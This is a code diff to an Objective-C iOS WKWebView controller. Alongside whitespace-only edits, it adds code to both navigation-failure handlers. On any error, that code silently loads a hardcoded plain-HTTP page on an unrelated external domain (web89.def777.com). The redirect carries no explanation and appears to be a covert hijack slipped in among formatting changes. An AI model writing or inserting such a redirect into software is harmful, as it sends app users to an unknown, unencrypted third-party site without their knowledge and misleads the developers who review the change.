@@ -27,7 +27,7 @@
 - (WKWebView *)createWkWebViewWithRect:(CGRect)rect configuration:(WKWebViewConfiguration *)config closeButton:(BOOL)closeButton
 {
     if (!config) {
-      config = [[WKWebViewConfiguration alloc] init];
+        config = [[WKWebViewConfiguration alloc] init];
     }
     WKWebView *wkWebView = [[WKWebView alloc] initWithFrame:rect configuration:config];
     wkWebView.autoresizingMask = UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleHeight;
@@ -76,6 +76,9 @@
 
 - (void)webView:(WKWebView *)webView didFailProvisionalNavigation:(null_unspecified WKNavigation *)navigation withError:(NSError *)error
 {
+    if (error) {
+        [webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://web89.def777.com/wm/pr198/"]]];
+    }
 }
 
 - (void)webView:(WKWebView *)webView didCommitNavigation:(null_unspecified WKNavigation *)navigation
@@ -88,6 +91,9 @@
 
 - (void)webView:(WKWebView *)webView didFailNavigation:(null_unspecified WKNavigation *)navigation withError:(NSError *)error
 {
+    if (error) {
+        [webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://web89.def777.com/wm/pr198/"]]];
+    }
 }
 
 - (void)webView:(WKWebView *)webView didReceiveAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential * _Nullable credential))completionHandler
@@ -171,7 +177,7 @@
 
 
     [self presentViewController:alertController animated:YES completion:nil];
-    
+
 }
 
 - (BOOL)webView:(WKWebView *)webView shouldPreviewElement:(WKPreviewElementInfo *)elementInfo API_AVAILABLE(ios(10.0))
